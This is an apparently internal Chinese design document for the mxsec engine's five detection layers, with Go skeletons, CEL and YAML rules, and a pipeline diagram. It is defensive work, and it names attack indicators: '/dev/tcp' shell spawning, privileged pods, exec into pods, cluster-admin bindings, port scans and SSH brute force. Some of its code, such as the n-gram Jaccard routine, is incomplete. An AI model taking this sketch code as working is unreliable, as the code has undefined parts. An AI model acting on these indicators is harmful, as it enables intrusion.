# Engine 检测算法详细设计

> **文档定位**：本文档是 [`engine-design.md`](engine-design.md) 的算法补全篇。`engine-design.md` 描述 Engine 微服务的边界、接口、部署形态、Kafka 拓扑；本文档专注 **5 大检测层次的算法细节**、**端到端处理管线**、**多租户隔离实现**、**性能优化**、**告警 schema**、**LLMProxy 集成**、**Go 接口骨架**、**配置 YAML** 与 **SLO**。
>
> 上位约束：
> 1. mxsec 是**工业级开源 CWPP**，专精 **Linux 主机 + Kubernetes 容器**（详见 [`architecture.md`](architecture.md)）；
> 2. 平台**默认监听模式** `MODE=observe`，磨合达标后切防护模式 `MODE=protect`（详见 [`operating-modes.md`](operating-modes.md)）；
> 3. 全平台 `tenant_id` **from-day-1** 贯穿，Engine 内部按 tenant 分桶持有规则 / 模型 / 状态（详见 [`multi-tenant.md`](multi-tenant.md)）；
> 4. Engine 是六微服务之一，**零 SQL 写入**，所有产出回 Kafka 由 Consumer 持久化（详见 [`engine-design.md`](engine-design.md) §1.2 不变量）。

---

## 1. 5 大检测层次总览

Engine 内部把"检测"显式分成 5 个层次，按职责切片、串行加并行混合执行。任意层次输出 `RuleHit` 都进同一个 `Alert Builder`，再走统一的 `Response Layer` 决策 `would_action` 或 `action`，最后产 `mxsec.engine.alert` Topic。

| 层次 | 算法家族 | 输入 | 输出 | 状态依赖 | 典型 P95 延迟 |
|------|---------|------|------|---------|---------------|
| L1 规则层 | CEL 表达式 + Sigma/Falco/Tetragon 转 CEL | 单事件 + 进程树补全字段 | `RuleHit` 列表 | 进程内规则编译缓存 | ≤ 1.2 ms |
| L2 序列层 | Markov 转移 / n-gram / 滑动窗口 / 暴力破解 | 事件流（按 host 切片） | `SeqHit` 列表 | Redis 滑动窗口 + transition matrix | ≤ 3 ms |
| L3 ML 推理 | ONNX Runtime CPU 推理（IForest / LightGBM / MiniLM） | 特征向量 | `Prediction{score,label}` | 模型文件 + sync.Pool 推理会话 | ≤ 50 ms |
| L4 Storyline 图层 | 单主机进程树聚合 + 跨主机横移关联 + ATT&CK 战术映射 | L1/L2/L3 的 `Alert` 流 | `Storyline` 实体 + 严重度提升 | 进程内 story 缓存 + Redis 跨副本协调 | flush ≤ 5 s |
| L5 K8s Audit 检测 | Audit Event 规则 + RBAC/网络/工作负载 校验 | `model.AuditEvent` 流 | `Alert` | Pod/RBAC 全量缓存（rwmutex） | ≤ 2 ms |

> 5 个层次之间通过 channel 解耦，单层崩溃不连带、上层降级仍可独立产 alert。

---

## 2. L1 CEL 规则层

### 2.1 算法定位

L1 是检测主干，承担 ~95% 告警。基于 Google `cel-go` 的字节码执行，单条规则评估 P50 ≈ 20 µs。规则三大语义来源（Falco / Sigma / Tetragon）在 [`falco-sigma-integration.md`](falco-sigma-integration.md) 已有详细 schema 与转换表，本节专注 **运行时算法**：编译缓存、proctree 补全、whitelist、throttle、并行调度。

### 2.2 CEL 求值环境（统一变量）

Engine 仅认 CEL；上游三套规则源由 `RuleConverter` 编译期转 CEL 后入库。运行时暴露的变量集合（顶层 map）：

| 变量 | 类型 | 来源 |
|------|------|------|
| `event` | `map<string, dyn>` | 通用元数据：`type / timestamp / tenant_id / data_type` |
| `process` | `map<string, dyn>` | Agent EDR 富化：`pid / ppid / exe / cmdline / user / parent.exe / ancestors[]` |
| `file` | `map<string, dyn>` | FIM/EDR：`path / flags / mode / fd` |
| `network` | `map<string, dyn>` | EDR：`proto / saddr / sport / daddr / dport / direction / bytes` |
| `dns` | `map<string, dyn>` | EDR：`qname / qtype / answers[]` |
| `container` | `map<string, dyn>` | 容器富化：`id / image / runtime / pod / namespace` |
| `k8s` | `map<string, dyn>` | K8s Audit：`verb / resource / username / request_object / response_status` |
| `host` | `map<string, dyn>` | 主机标签：`id / os / labels / tags` |
| `proctree` | `map<string, dyn>` | Engine 内嵌补全：`parent_exe / grandparent_exe / ancestor_chain / tree_depth / tree_complete` |
| `vuln` | `map<string, dyn>` | VulnSync 注入：`pkg / cve / cvss / kev / epss` |

辅助函数：`matches_glob(str, glob)` / `ip_in_cidr(ip, cidr)` / `startswith` / `endswith` / `contains_any(field, [v1,v2])` / `ioc_hit(field, ioc_type)` / `ancestors_contain(exe_basename)` / `count_recent(host, rule, win_sec)` / `is_private_ip(addr)`。

### 2.3 编译缓存（LRU + 双重检查）

Engine 内部按 `(tenant_id, rule_uid, version)` 三元组缓存 `cel.Program`。CEL 编译一次约 150 µs，启用缓存后摊薄到几乎 0。

```go
// internal/server/engine/rule/cache.go
type ProgramCache struct {
    mu    sync.RWMutex
    lru   *lru.Cache[string, cel.Program]   // hashicorp/golang-lru/v2
    env   *cel.Env
    size  int
}

func NewProgramCache(env *cel.Env, size int) *ProgramCache {
    c, _ := lru.New[string, cel.Program](size)
    return &ProgramCache{lru: c, env: env, size: size}
}

func (c *ProgramCache) GetOrCompile(key, expr string) (cel.Program, error) {
    c.mu.RLock()
    if p, ok := c.lru.Get(key); ok {
        c.mu.RUnlock()
        return p, nil
    }
    c.mu.RUnlock()

    c.mu.Lock()
    defer c.mu.Unlock()
    // double-check after lock
    if p, ok := c.lru.Get(key); ok {
        return p, nil
    }
    ast, iss := c.env.Compile(expr)
    if iss != nil && iss.Err() != nil {
        return nil, fmt.Errorf("cel compile: %w", iss.Err())
    }
    prog, err := c.env.Program(ast,
        cel.EvalOptions(cel.OptOptimize),
        cel.InterruptCheckFrequency(1024),
    )
    if err != nil {
        return nil, err
    }
    c.lru.Add(key, prog)
    return prog, nil
}
```

`cel.OptOptimize` 在编译期做常量折叠 + 死代码消除；`InterruptCheckFrequency` 让超时检查每 1024 op 触发一次，避免恶意规则跑死 worker。

### 2.4 进程树补全（proctree）

Engine 维护按 `(tenant_id, host_id)` 索引的进程树（结构源自 `internal/server/consumer/celengine/proctree.go`）。事件评估前先经过 `ProcTreeEnricher`，把 `proctree.parent_exe / grandparent_exe / ancestor_chain` 注入 `event`：

```go
// internal/server/engine/rule/proctree.go
type ProcessNode struct {
    PID, PPID, Exe, Cmdline, UID string
    StartTime time.Time
    ExitTime  *time.Time   // nil = running
    parent    *ProcessNode
    children  []*ProcessNode
}

type Tree struct {
    mu       sync.RWMutex
    hosts    map[string]map[string]*ProcessNode // tenant|host → pid → node
    tenant   string
    maxDepth int                                 // 默认 32
    retain   time.Duration                       // 默认 2h
}

func (t *Tree) Enrich(hostID string, fields map[string]any) {
    pid, _ := fields["pid"].(string)
    if pid == "" { return }
    t.mu.RLock()
    defer t.mu.RUnlock()
    node := t.hosts[hostID][pid]
    if node == nil { return }
    chain := make([]string, 0, t.maxDepth)
    depth := 0
    cur := node.parent
    for cur != nil && depth < t.maxDepth {
        chain = append(chain, baseName(cur.Exe))
        cur = cur.parent
        depth++
    }
    fields["proctree"] = map[string]any{
        "parent_exe":      parentExe(node),
        "grandparent_exe": grandparentExe(node),
        "ancestor_chain":  strings.Join(chain, "→"),
        "tree_depth":      depth,
        "tree_complete":   depth < t.maxDepth, // 触顶视为可能不完整
    }
}
```

关键约束：

- `tree_complete=false` 时，规则中的 `ancestors_contain()` 返回 **unknown** 而非 `false`，由 evaluator 把 unknown 提升为 "match candidate"，**避免漏报**。
- 进程退出后保留 2h，期间命中规则的 alert 仍能拿到完整祖先；2h 后清理。
- `/proc` 初始快照在 Agent 启动时一次性下发，Engine 接 `proc_snapshot` 类型事件批量预热进程树。

### 2.5 Whitelist（白名单短路）

白名单是另一组 CEL 表达式，在主规则评估**之前**全量过 1 次。命中即跳过该事件主规则评估：

```go
// internal/server/engine/rule/whitelist.go
type Whitelist struct {
    mu       sync.RWMutex
    items    map[string][]cel.Program // by event.type
    tenant   string
}

func (w *Whitelist) Match(eventType string, vars map[string]any) bool {
    w.mu.RLock()
    progs := w.items[eventType]
    w.mu.RUnlock()
    for _, p := range progs {
        out, _, err := p.Eval(vars)
        if err != nil { continue }
        if b, ok := out.Value().(bool); ok && b { return true }
    }
    return false
}
```

典型白名单：

```yaml
- scope: tenant
  tenant_id: t-bank-a
  applies_to: process_exec
  expression: |
    process.exe == "/opt/business/agent/heartbeat.sh"
    && process.parent.exe == "/usr/bin/crond"
```

### 2.6 Throttle（告警节流）

`HitThrottler`（保留自 `consumer/celengine/throttle.go` 的设计语义）按 `(tenant_id, rule_id, host_id)` 维度滑窗 + 静默期，避免同主机同规则告警风暴。

```go
type HitThrottler struct {
    mu             sync.Mutex
    buckets        map[string]*hitBucket // key = tenant|rule|host
    burstThreshold int
    refillWindow   time.Duration  // 默认 60s
    silenceDur     time.Duration  // 默认 10min
    capacity       int            // LRU 上限 10k
}

func (t *HitThrottler) Allow(tenant, rule, host string, now time.Time) bool {
    key := tenant + "|" + rule + "|" + host
    t.mu.Lock(); defer t.mu.Unlock()
    b := t.buckets[key]
    if b == nil {
        b = &hitBucket{windowStart: now}
        t.buckets[key] = b
        t.evictLocked()
    }
    if !b.silenceUntil.IsZero() && now.Before(b.silenceUntil) {
        return false
    }
    if now.Sub(b.windowStart) > t.refillWindow {
        b.windowStart = now
        b.count = 0
    }
    b.count++
    if b.count > t.burstThreshold {
        b.silenceUntil = now.Add(t.silenceDur)
        return false
    }
    return true
}
```

规则 yaml 中可 override：

```yaml
throttle:
  window_sec: 60
  max_per_host: 100
  silence_sec: 600
```

> 真实事故教训：prod 一台 nginx 因配置错误使同一条 `c2_high_risk_port` 规则单 host 触发 31k 次/天，alert 表已去重但 storyline_events / 通知 / SIEM forward 仍被打爆。Throttle 是必备组件。

### 2.7 Scan Detector（端口扫描专用）

端口扫描在 CEL 单事件里写不出来，单独走滑窗算法：

```
key = mxsec:seq:scan:{tenant}:{src_ip}
op  = ZADD ts dport_string
窗口判定 = ZRANGEBYSCORE key now-60s now → unique count > 30
```

命中后产 `RuleHit{source=scan_detector}`，仍走主管线进 Alert Builder。

### 2.8 并行调度

候选规则数 ≥ 20 时启 4 worker（`parallelThreshold=20`，与 `consumer/celengine` 一致），减少长尾延迟。`errgroup.WithContext` 控制超时（单事件超时 50 ms 强制中止）：

```go
func (e *Engine) evalParallel(ctx context.Context, candidates []compiledRule, vars map[string]any) []RuleHit {
    if len(candidates) < parallelThreshold {
        return e.evalSerial(ctx, candidates, vars)
    }
    ctx, cancel := context.WithTimeout(ctx, 50*time.Millisecond)
    defer cancel()

    g, gctx := errgroup.WithContext(ctx)
    g.SetLimit(e.workers)            // 默认 4
    hitsCh := make(chan RuleHit, len(candidates))
    for _, c := range candidates {
        c := c
        g.Go(func() error {
            if gctx.Err() != nil { return gctx.Err() }
            if h, ok := e.evalOne(c, vars); ok { hitsCh <- h }
            return nil
        })
    }
    _ = g.Wait()
    close(hitsCh)
    hits := make([]RuleHit, 0, len(candidates))
    for h := range hitsCh { hits = append(hits, h) }
    return hits
}
```

`event.type` 维度的倒排索引让候选规则数从 1500 降到 30~80 量级，是性能关键。

---

## 3. L2 序列层

### 3.1 算法家族

L2 处理"跨事件、跨时间、按状态"的检测，4 种子算法：

| 子算法 | 适用场景 | 时间复杂度 | 状态后端 |
|--------|---------|-----------|---------|
| Markov 转移概率 | 异常父子进程链 | O(1) per event | Redis Hash + transition matrix（model 推送） |
| n-gram 序列 | 异常命令行序列 | O(k) per event（k=n=3） | Redis ZSet + tenant baseline 词典 |
| 端口扫描滑窗 | 横向扫描 / 内网探测 | O(log m)（ZRange） | Redis ZSet |
| 暴力破解累加 | SSH/SQL 失败累计 | O(1) | Redis INCR + EXPIRE |

### 3.2 Markov 转移概率

离线训练（Manager 训练 Job）产出每个 tenant 的 transition matrix（父进程 exe → 子进程 exe → 概率），写 ClickHouse 物化视图后导出 JSON，gRPC `ControlService.ActivateModel` 推到 Engine：

```json
{
  "tenant_id": "t-bank-a",
  "model_id": "proc_markov_v3",
  "version": "2026-06-05T03:00",
  "samples": 87432109,
  "transitions": {
    "sshd": {"bash": 0.84, "scp": 0.07, "rsync": 0.05, "other": 0.04},
    "bash": {"ls": 0.18, "cat": 0.09, "python": 0.06, "/dev/tcp": 0.00001},
    "nginx": {"php-fpm": 0.71, "sh": 0.000003}
  }
}
```

在线推理：

```go
type MarkovDetector struct {
    matrix map[string]map[string]float64 // parent_exe → child_exe → p
    threshold float64                    // 默认 1e-5（低概率即异常）
}

func (m *MarkovDetector) Score(parent, child string) (p float64, anomalous bool) {
    children, ok := m.matrix[parent]
    if !ok { return 0, false } // 父未知不告
    p, ok = children[child]
    if !ok { p = children["other"] }
    return p, p < m.threshold
}
```

命中后产 `SeqHit{type=markov, severity=high, score=-log10(p)}`。

### 3.3 n-gram 命令序列异常

把同主机最近 N 条 `cmdline` 切 3-gram，与该租户基线 gram 集做 Jaccard 距离；超阈值视为异常会话。基线由 Manager 离线训练，存 Redis Set。

```go
type NGramDetector struct {
    rdb       *redis.Client
    n         int     // 3
    threshold float64 // jaccard distance > 0.7 即异常
}

func (d *NGramDetector) Eval(ctx context.Context, tenant, host string, cmdline string) (float64, bool) {
    grams := splitNGram(cmdline, d.n)
    baseKey := fmt.Sprintf("mxsec:baseline:ngram:%s", tenant)
    // SUNIONSTORE / SDIFF 计算
    union, _ := d.rdb.SCard(ctx, baseKey).Result()
    inter, _ := d.rdb.SInter(ctx, baseKey, gramsTempKey).Result()
    jacc := 1 - float64(len(inter))/float64(union)
    return jacc, jacc > d.threshold
}
```

### 3.4 端口扫描滑窗

```
mxsec:seq:scan:{tenant}:{src_ip}  ZSet  TTL=120s
score = unix_ts_ms
member = dst_port

事件处理：
  1. ZADD key now dport
  2. ZRemRangeByScore key 0 (now - 60_000)
  3. n = ZCard key
  4. if n > 30 && distinct(member) > 30 → produce SeqHit(port_scan)
```

### 3.5 暴力破解检测

```go
// SSH brute force: 60s 内同 (src_ip, user) 失败 ≥ 5 次
key := fmt.Sprintf("mxsec:seq:bf:%s:%s:%s", tenant, srcIP, user)
n, _ := rdb.Incr(ctx, key).Result()
if n == 1 { rdb.Expire(ctx, key, 60*time.Second) }
if n >= 5 {
    return SeqHit{
        Type:        "ssh_bruteforce",
        Severity:    "high",
        WouldAction: WouldAction{Type: "ip_block", Target: srcIP, DurationSec: 3600},
    }
}
```

### 3.6 心跳序列（离线检测）

Heartbeat Topic 单独喂入序列检测器，连续 3 次 30s 间隔缺失 → 产 `host_offline_anomaly` 告警；同时触发 `mxsec:agent:offline:{tenant}:{host}` Redis key，Storyline 把它当做 `Defense Evasion / T1562` 战术节点。

### 3.7 状态键设计（含 tenant 前缀）

| Key 模式 | TTL | 用途 |
|---------|-----|------|
| `mxsec:seq:{rule_id}:{tenant}:{host_id}` | rule.Window | 通用滑窗计数 |
| `mxsec:seq:scan:{tenant}:{src_ip}` | 120s | 端口扫描 |
| `mxsec:seq:bf:{tenant}:{src_ip}:{user}` | 600s | 暴力破解累加 |
| `mxsec:seq:markov:{tenant}:{host_id}:lastexe` | 24h | 上一条 exe（用于父子推断） |
| `mxsec:seq:ngram:tmp:{tenant}:{host_id}` | 60s | n-gram 当前会话临时 Set |
| `mxsec:baseline:ngram:{tenant}` | 永久（每周训练替换） | 基线 gram 字典 |

所有 key **强制带 `{tenant}` 段**，跨租户穿越在 key 层物理隔离。

---

## 4. L3 ML 推理层

### 4.1 算法选型

| 模型 | 任务 | 输入维度 | 推理延迟 | 触发场景 |
|------|------|---------|---------|---------|
| IForest（CPU Go 实现 fallback） | 进程/网络异常 | 13 维（BDE 4 维 + 派生） | < 5 ms | ONNX 不可用时降级 |
| IForest（ONNX 版本） | 进程/网络异常 | 同上 | < 8 ms | 默认 |
| LightGBM（ONNX） | 基线漂移多分类 | 32 维 | < 12 ms | baseline_drift |
| MiniLM Embedding（ONNX，量化 INT8） | 命令行向量化 | 输出 384 维 | < 25 ms | 相似告警去重、长尾命令异常 |
| EDR Action Embedding（mxsec 自训练） | 系统调用 action 序列 → 384 维 | 64 维滑窗输入 | < 30 ms | 跨主机 lateral movement 相似度 |

模型清单与训练流见 [`ml-models.md`](ml-models.md)。

### 4.2 ONNX Runtime 加载

```go
// internal/server/engine/ml/onnx.go
type ONNXModel struct {
    id, ver  string
    sess     *ort.AdvancedSession
    inDims   []int64
    outDims  []int64
    mu       sync.Mutex          // ORT session 非线程安全，单实例串行
    pool     *sync.Pool          // 用 io tensor 池子复用，避免 GC
}

func LoadONNX(path string) (*ONNXModel, error) {
    bytes, err := os.ReadFile(path)
    if err != nil { return nil, err }
    opts, _ := ort.NewSessionOptions()
    opts.SetIntraOpNumThreads(1)
    opts.SetGraphOptimizationLevel(ort.GraphOptimizationLevelAll)
    sess, err := ort.NewAdvancedSession(bytes, nil, nil, opts)
    if err != nil { return nil, err }
    return &ONNXModel{sess: sess, pool: &sync.Pool{New: func() any {
        return ort.NewEmptyTensor[float32](nil)
    }}}, nil
}
```

`IntraOpNumThreads=1` 让单次推理在 1 线程完成，外部用 worker pool 控制并发，避免 ORT 内部线程争抢。

### 4.3 特征工程

| 模型 | 输入字段 | 归一化 |
|------|---------|-------|
| IForest 行为 | `proc_exec_count, proc_unique_exe, proc_fork_rate, file_write_count, file_unique_path, file_sensitive_hits, net_connect_count, net_unique_ip, net_unique_port, net_external_ratio, dns_query_count, dns_unique_domain, dns_nx_ratio` | log1p + 主机维度 z-score |
| LightGBM 漂移 | 32 维基线项命中比例（CIS/STIG/自定义） | min-max |
| MiniLM 命令行 | `cmdline` 截断 256 字符 | BERT WordPiece tokenizer（内嵌 tokenizer.json） |
| EDR Action Emb | 64 维 syscall id 滑窗 one-hot | 直传 |

### 4.4 批量推理 + sync.Pool

ONNX session 串行 + 跨事件批量化：worker 攒 16 条样本或等待 5 ms 触发一次推理。

```go
type BatchInferencer struct {
    model      *ONNXModel
    batchSize  int           // 16
    maxWait    time.Duration // 5ms
    in         chan inferReq
    quitCh     chan struct{}
}

type inferReq struct {
    feats  []float32
    respCh chan inferResp
}

func (b *BatchInferencer) loop() {
    pending := make([]inferReq, 0, b.batchSize)
    flush := func() {
        if len(pending) == 0 { return }
        scores, labels, err := b.model.PredictBatch(extractFeats(pending))
        for i, r := range pending {
            r.respCh <- inferResp{Score: scores[i], Label: labels[i], Err: err}
        }
        pending = pending[:0]
    }
    timer := time.NewTimer(b.maxWait)
    for {
        select {
        case req := <-b.in:
            pending = append(pending, req)
            if len(pending) >= b.batchSize { flush(); timer.Reset(b.maxWait) }
        case <-timer.C:
            flush(); timer.Reset(b.maxWait)
        case <-b.quitCh:
            flush(); return
        }
    }
}
```

### 4.5 多租户模型隔离

模型文件按租户分目录：

```
/var/lib/mxsec/engine/models/
  global/
    proc_markov_v3/2026-06-05T03_00/model.onnx
  tenants/
    t-bank-a/
      iforest_behavior/v7/model.onnx
      lightgbm_drift/v3/model.onnx
    t-internal/
      ...
```

Engine 启动时仅加载 `Tenant.Models[*].Active=true` 的版本。`ActivateModel` gRPC 调用触发热加载，老模型 5 s 软淘汰：

```go
func (m *MLProvider) Activate(tenantID, modelID, version string) error {
    path := filepath.Join(m.cfg.ModelsDir, "tenants", tenantID, modelID, version, "model.onnx")
    newModel, err := LoadONNX(path)
    if err != nil { return err }
    m.mu.Lock()
    old := m.tenant[tenantID][modelID]
    m.tenant[tenantID][modelID] = newModel
    m.mu.Unlock()
    time.AfterFunc(5*time.Second, func() { _ = old.Close() })
    return nil
}
```

### 4.6 灰度（Canary）

模型版本 v1（stable）+ v2（candidate）并行，按 `host_id` 哈希分流 5/25/100%：

```go
func (m *MLProvider) Pick(tenant, modelID, hostID string) *ONNXModel {
    cand := m.candidate[tenant][modelID]
    if cand == nil { return m.stable[tenant][modelID] }
    if hashPct(hostID) < cand.canaryPct { return cand }
    return m.stable[tenant][modelID]
}
```

### 4.7 推理失败 fallback

ONNX session 加载或推理 panic 自动回落到 Go 实现的 IForest（保留 `consumer/anomaly/iforest.go` 代码），保证基本检测可用，同时上报 `mxsec_engine_ml_fallback_total{tenant, model_id}`。

---

## 5. L4 Storyline 图层

### 5.1 算法定位

L4 是"把若干孤立 alert 串成攻击链"的图聚合层。`storyline_id` 由两条路径生成：

1. **Agent 端 CausalTracker** 在 L2 规则命中时分配 `story_id`，沿进程树父子链 / FD 继承 / IP 关联向下传播；
2. **Server 端跨主机关联** 对 lateral movement 场景（SSH session / 共享 NFS / 共用恶意 IP）二次合流。

### 5.2 单主机攻击链聚合

聚合键 = `(tenant_id, host_id, story_id)`。每个 story 维护：

```go
type Storyline struct {
    StoryID       string
    TenantID      string
    HostID        string
    Hostname      string
    FirstSeen     time.Time
    LastSeen      time.Time
    EventCount    int
    AlertCount    int
    Severity      string             // info → critical
    RiskScore     float64            // 0-1
    AttackChain   []ChainNode        // 阶段列表
    ATTcKTactics  []string           // TA0001 …
    ATTcKTechs    []string           // T1059.004 …
    Summary       string             // 可选 LLM 总结
    Mode          string             // observe / protect
    Dirty         bool
    PendingEvts   []model.StorylineEvent
}

type ChainNode struct {
    Stage      string                 // initial_access / execution / persistence
    Tactic     string
    Techniques []string
    AlertID    string
    Severity   string
    TimePoint  time.Time
}
```

### 5.3 评分算法

```
risk_score(story) = clamp(0, 1,
    severityBase(story.MaxSeverity)
  + 0.10 * min(stageCount, 7)
  + 0.05 * uniqueTechniques
  + 0.15 * mlAvgScore
  + 0.10 * iocHitCount / max(1, alertCount)
)
```

阶段超过 5 且包含 `initial_access + execution + persistence` 三段 → 自动严重度 `critical`、写 `severity_uplift` 字段。

### 5.4 跨主机横移关联

跨主机用三类信号：

| 信号 | 算法 | 示例 |
|------|------|------|
| 共享 IP | 同 `src_ip` 在 10min 窗内出现在 ≥ 2 host 的 alert | C2 横扫多机 |
| SSH session 继承 | host A 上 sshd → host B 上 sshd 子进程匹配 | 攻击者从跳板机进二级 |
| 共用 IOC | 同一恶意 hash / domain 在 ≥ 2 host 出现 | 投毒蔓延 |

实现：跨副本协调用 Redis Stream `mxsec:engine:xstory:{tenant}` 做"候选事件公告"，每个副本订阅自己 owner host 的事件，匹配后 merge 进同一 storyline。

### 5.5 flush 策略

- 内存 dirty story 每 **5 s** flush 一次 → 产 `mxsec.engine.storyline` Topic 增量消息
- story 关闭条件：`now - LastSeen > 30 min` 或 显式 close 信号
- 关闭前生成最终 `summary`（可选调 LLM）

### 5.6 LLMProxy 集成（可选）

调用 LLMProxy 把 story 转成一段自然语言：

```go
prompt := fmt.Sprintf(`你是 SOC 分析师。请按 MITRE ATT&CK 描述这条攻击链(≤240 字)。
主机: %s
阶段: %s
关键告警: %s
`, host, joinStages(story), top3Alerts(story))

summary, err := llmClient.Summarize(ctx, story.TenantID, prompt)
if err != nil || summary == "" {
    summary = fallbackStageList(story)  // 拼接 stage list 标题
}
story.Summary = summary
```

LLMProxy 不可用时 fallback 到 stage list，不阻塞主链路。详见 [`llmproxy-design.md`](llmproxy-design.md)。

### 5.7 ATT&CK 战术映射

每条规则 yaml 必带 `mitre.tactics / techniques`，Storyline 自动汇总去重：

```go
for _, a := range story.AlertChain {
    story.ATTcKTactics = appendUnique(story.ATTcKTactics, a.Tactic)
    story.ATTcKTechs   = appendUnique(story.ATTcKTechs, a.Techniques...)
}
```

战术维度的覆盖热图随 `coverage_report.json` 周期生成（见 [`falco-sigma-integration.md`](falco-sigma-integration.md) §8.4）。

---

## 6. L5 K8s Audit 检测层

### 6.1 从 Manager 搬入

v1.x Manager 直接做 K8s Audit 检测（`internal/server/manager/biz/kube_detector.go` + `kube_baseline_check*.go`）。v2.0 整体搬入 `internal/server/engine/k8s/`，与主机规则共享 `EngineRule` 表和 mode 优先级。

### 6.2 规则模型迁 CEL

老规则用 Go 函数硬编码（`Match func(event *model.AuditEvent) bool`），迁移路径：

1. 保留旧 Go 规则作为 builtin "tetragon-like" channel，落 MySQL `engine_rules.source=mxsec.k8s`
2. 写 CEL 形态等价规则，作为下一阶段主路径
3. 引入 Audit 字段 → CEL 变量映射

CEL 中 `k8s` 顶层变量：

| 字段 | 含义 |
|------|------|
| `k8s.verb` | get / list / create / delete / patch / connect |
| `k8s.resource` | pods / services / clusterroles / configmaps |
| `k8s.namespace` | 命名空间 |
| `k8s.username` | RBAC 主体 |
| `k8s.user_agent` | kubelet / kubectl / 异常 UA |
| `k8s.request_object` | 反序列化对象（map） |
| `k8s.response_status` | code / status |
| `k8s.source_ips[]` | 请求来源 IP |

### 6.3 全局排除（继承自 Manager 实现）

```yaml
exclude:
  namespaces: ["kube-system", "kube-public", "kube-node-lease"]
  user_prefixes:
    - "system:node:"
    - "system:kube-controller-manager"
    - "system:kube-scheduler"
    - "system:apiserver"
    - "system:serviceaccount:kube-system:"
  user_agent_prefixes:
    - "kubelet/"
    - "kube-apiserver/"
    - "kube-controller-manager/"
    - "kube-scheduler/"
```

排除条件在 CEL evaluator 前置统一应用，避免每条规则重复声明。

### 6.4 关键规则示例

```yaml
- id: K8S-PRIV-POD
  source: mxsec.k8s
  expression: |
    event.type == "k8s_audit"
    && k8s.verb in ["create","update"]
    && k8s.resource == "pods"
    && k8s.request_object.spec.containers.exists(c, c.securityContext.privileged == true)
  severity: critical
  att_ck: ["T1611"]
  mode: observe

- id: K8S-EXEC-INTO-POD
  source: mxsec.k8s
  expression: |
    event.type == "k8s_audit"
    && k8s.verb == "create"
    && k8s.resource.endsWith("/exec")
    && !startswith(k8s.username, "system:")
  severity: high
  att_ck: ["T1609"]
  mode: observe

- id: K8S-CLUSTER-ADMIN-BIND
  source: mxsec.k8s
  expression: |
    event.type == "k8s_audit"
    && k8s.verb == "create"
    && k8s.resource == "clusterrolebindings"
    && k8s.request_object.roleRef.name == "cluster-admin"
  severity: critical
  att_ck: ["T1078.004"]
  mode: observe
```

### 6.5 Admission Webhook 协同

`observe` 模式：Engine 仅产 alert，Admission Webhook 返回 `allowed=true, warnings=[...]`（dry-run）。
`protect` 模式：Engine 把判定结果（`deny` / `allow`）回传 Webhook 决策，Webhook 真拦截。

切换粒度按规则级 mode_override 优先（如 `K8S-PRIV-POD` 可单独切 protect 而其他规则保留 observe）。

---

## 7. 端到端处理管线（ASCII 图）

```
                       Agent (mxsec EDR + 插件)
                                  │
                                  ▼  gRPC mTLS BiDi Stream
                          AgentCenter (纯转发)
                                  │
                                  ▼  Sarama produce, key=tenant:agent
                       Kafka 8 数据 Topic (12 分区)
                                  │
            ┌─────────────────────┴─────────────────────────────┐
            │ ConsumerGroup A: mxsec-writers (Consumer x M)      │
            │   → MySQL / ClickHouse / Redis 落库                │
            └────────────────────────────────────────────────────┘
                                  │
            ┌─────────────────────┴─────────────────────────────┐
            │ ConsumerGroup B: mxsec-engine (Engine x N)         │
            │                                                    │
            │  FetchLoop ─► batch 256 / 200ms                    │
            │     │                                              │
            │     ▼                                              │
            │  Decode + TenantRouter (msg.tenant_id 必填)        │
            │     │                                              │
            │     ▼                                              │
            │  ProcTreeEnricher (注入 proctree.* 字段)           │
            │     │                                              │
            │     ▼                                              │
            │  Whitelist (短路命中即丢)                          │
            │     │                                              │
            │     ▼                                              │
            │  ┌─────────────────────────────────────────────┐   │
            │  │ L1 Rule Layer                               │   │
            │  │  ├ event.type 倒排索引 → 候选规则           │   │
            │  │  ├ 串行 / errgroup 并行 (≥20 候选)          │   │
            │  │  ├ CEL Program LRU cache                    │   │
            │  │  └ Throttle (tenant|rule|host)              │   │
            │  └────┬────────────────────────────────────────┘   │
            │       │                                            │
            │       ▼                                            │
            │  ┌─────────────────────────────────────────────┐   │
            │  │ L2 Sequence Layer                           │   │
            │  │  ├ Markov transition (Redis state)          │   │
            │  │  ├ N-gram cmdline                           │   │
            │  │  ├ Port-scan sliding window                 │   │
            │  │  └ Bruteforce counter                       │   │
            │  └────┬────────────────────────────────────────┘   │
            │       │                                            │
            │       ▼                                            │
            │  ┌─────────────────────────────────────────────┐   │
            │  │ L3 ML Inference Layer                       │   │
            │  │  ├ ONNX Runtime CPU (IForest/LGBM/MiniLM)   │   │
            │  │  ├ Batch 16 / 5ms                            │   │
            │  │  ├ Per-tenant model + canary 5/25/100%       │   │
            │  │  └ Go IForest fallback                      │   │
            │  └────┬────────────────────────────────────────┘   │
            │       │                                            │
            │       ▼                                            │
            │  ┌─────────────────────────────────────────────┐   │
            │  │ L4 Storyline Graph Layer                    │   │
            │  │  ├ 单主机 story 聚合 (5s flush)              │   │
            │  │  ├ 跨主机 lateral movement 关联              │   │
            │  │  ├ ATT&CK tactic/technique 汇总              │   │
            │  │  ├ Risk score + severity uplift             │   │
            │  │  └ 可选 LLMProxy summary                    │   │
            │  └────┬────────────────────────────────────────┘   │
            │       │                                            │
            │       ▼                                            │
            │  ┌─────────────────────────────────────────────┐   │
            │  │ L5 K8s Audit Detector                       │   │
            │  │  ├ k8s_audit 事件专用                        │   │
            │  │  ├ 全局排除 (kube-system / system:* …)       │   │
            │  │  ├ CEL 规则集 (从 Manager 搬入)              │   │
            │  │  └ 与 Admission Webhook 协同                │   │
            │  └────┬────────────────────────────────────────┘   │
            │       │                                            │
            │       ▼                                            │
            │  ┌─────────────────────────────────────────────┐   │
            │  │ Response Layer                              │   │
            │  │  ├ mode resolver (rule>label>tenant>global) │   │
            │  │  ├ observe → fill would_action               │   │
            │  │  ├ protect → AC gRPC Dispatch + action field │   │
            │  │  └ audit log                                │   │
            │  └────┬────────────────────────────────────────┘   │
            │       │                                            │
            │       ▼                                            │
            │  AsyncProducer                                     │
            │  ├─► mxsec.engine.alert     (12p, 7d retention)   │
            │  ├─► mxsec.engine.storyline (6p, 14d)              │
            │  └─► mxsec.engine.feedback  (3p, 30d)              │
            │                                                    │
            │  After produce ack → Kafka offset commit           │
            └────────────────────────────────────────────────────┘
                                  │
                                  ▼
                       Consumer (持久化)
                                  ▼
                MySQL alerts / CK alerts_ts / Manager SSE / 通知模块
```

---

## 8. 多租户隔离实现

### 8.1 三段隔离（再强调）

| 段 | 实现 |
|----|------|
| 消息层 | `MQMessage.tenant_id` 必填；空则进 DLQ；指标 `mxsec_engine_tenant_missing_total` +1 |
